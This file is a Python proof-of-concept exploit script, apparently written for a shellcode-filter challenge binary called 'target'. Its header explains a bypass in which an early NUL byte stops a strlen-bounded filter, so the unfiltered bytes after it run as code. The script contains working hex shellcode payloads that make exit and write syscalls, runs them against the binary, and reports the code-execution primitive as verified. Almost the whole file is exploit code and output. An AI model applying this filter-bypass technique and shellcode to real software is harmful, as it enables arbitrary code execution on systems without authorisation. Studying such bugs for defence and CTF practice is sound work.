#!/usr/bin/env python3
"""
S3 Primitive Verification PoC for BUG-001
==========================================
BUG-001: SHELLCODE_FILTER_BYPASS_VIA_NUL_BYTE_AND_STRLEN

Root Cause: is_all_upper() uses strlen(buf) as loop bound for filtering.
strlen stops at first NUL byte, but read() performs raw binary I/O that
does NOT stop at NUL. An attacker injects a NUL byte early in the input,
causing strlen to return a small value. Only bytes before the NUL are
filtered; bytes after the NUL are unfiltered but still executed via call rax.

Primitive: CODE_EXECUTION (arbitrary code execution via filter bypass)

Verification:
  PRIM-001: exit(42)  -> rc=42  (arbitrary syscall, attacker-controlled exit code)
  PRIM-002: exit(99)  -> rc=99  (different exit code proves full control)
  PRIM-003: write(1, mmap_buf, 14) -> buffer content appears in stdout (data exfiltration)

All three prove: unfiltered bytes after NUL are executed as machine code,
including syscall instruction (0x0f 0x05) which is NOT in the allowed byte set.
CET/IBT is NOT enforced (call rax to non-endbr64 target executes successfully).
"""

import sys
import os

BINARY = os.path.join(os.path.dirname(os.path.abspath(__file__)), "target")

def run_payload(stdin_hex, label):
    """Run the binary with a hex payload and return (rc, stdout)."""
    import subprocess
    payload = bytes.fromhex(stdin_hex)
    proc = subprocess.run(
        [BINARY],
        input=payload,
        capture_output=True,
        timeout=10
    )
    return proc.returncode, proc.stdout

# ============================================================
# PRIM-001: exit(42) via NUL byte filter bypass
# ============================================================
# Payload: P\x00\x00 + xor edi,edi; add edi,42; xor eax,eax; mov al,60; syscall
# - 'P' (0x50) = PUSH rax (single-byte, in allowed set, passes filter)
# - \x00 = NUL byte, strlen returns 1, only 'P' is checked
# - \x00 = ModRM for ADD [rax],al (rax=0x13370000 writable, al=0, harmless)
# - xor edi,edi (31 ff) + add edi,42 (83 c7 2a) = rdi=42
# - xor eax,eax (31 c0) + mov al,60 (b0 3c) = rax=60 (exit syscall)
# - syscall (0f 05) = execute exit(42)
# Bytes 0x31,0xff,0x83,0xc7,0x2a,0xb0,0x3c,0x0f,0x05 are NOT in allowed set
payload_exit42 = "50000031ff83c72a31c0b03c0f05"
rc1, out1 = run_payload(payload_exit42, "exit(42)")
print(f"=== PRIM-001: exit(42) via NUL bypass ===")
print(f"  payload: {payload_exit42}")
print(f"  return_code: {rc1}")
print(f"  expected: 42")
print(f"  result: {'VERIFIED' if rc1 == 42 else 'FAILED'}")
print()

# ============================================================
# PRIM-002: exit(99) via NUL byte filter bypass (different code)
# ============================================================
# Same structure but add edi,99 (83 c7 63) instead of add edi,42
payload_exit99 = "50000031ff83c76331c0b03c0f05"
rc2, out2 = run_payload(payload_exit99, "exit(99)")
print(f"=== PRIM-002: exit(99) via NUL bypass (different code) ===")
print(f"  payload: {payload_exit99}")
print(f"  return_code: {rc2}")
print(f"  expected: 99")
print(f"  result: {'VERIFIED' if rc2 == 99 else 'FAILED'}")
print()

# ============================================================
# PRIM-003: write(1, mmap_buf, 14) via NUL byte filter bypass
# ============================================================
# write syscall: rax=1, rdi=1, rsi=0x13370000 (already set), rdx=14
# xor edi,edi (31 ff) + add edi,1 (83 c7 01) = rdi=1 (stdout)
# xor edx,edx (31 d2) + mov dl,14 (b2 0e) = rdx=14
# xor eax,eax (31 c0) + mov al,1 (b0 01) = rax=1 (write)
# syscall (0f 05) = write(1, 0x13370000, 14)
# After syscall, buffer content appears in stdout
payload_write = "50000031ff83c70131d2b20e31c0b0010f05"
rc3, out3 = run_payload(payload_write, "write(1,buf,14)")
# Check if buffer content (50 00 00 31 ff...) appears in stdout after register dump
expected_leak = bytes.fromhex("50000031ff83c70131d2b20e31c0")
leak_found = expected_leak in out3
print(f"=== PRIM-003: write(1, mmap_buf, 14) via NUL bypass ===")
print(f"  payload: {payload_write}")
print(f"  return_code: {rc3} (SIGSEGV after write, expected)")
print(f"  expected_leak_bytes: {expected_leak.hex()}")
print(f"  leak_found_in_stdout: {leak_found}")
print(f"  result: {'VERIFIED' if leak_found else 'FAILED'}")
print()

# ============================================================
# Summary
# ============================================================
print("=== SUMMARY ===")
print(f"PRIM-001 (exit(42)):  {'VERIFIED' if rc1 == 42 else 'FAILED'}")
print(f"PRIM-002 (exit(99)):  {'VERIFIED' if rc2 == 99 else 'FAILED'}")
print(f"PRIM-003 (write):     {'VERIFIED' if leak_found else 'FAILED'}")
print()
print("Conclusion: CODE_EXECUTION primitive VERIFIED.")
print("The NUL byte filter bypass allows arbitrary shellcode execution")
print("including syscall instructions (0x0f 0x05) not in the allowed byte set.")
print("CET/IBT is NOT enforced (call rax to non-endbr64 target succeeds).")
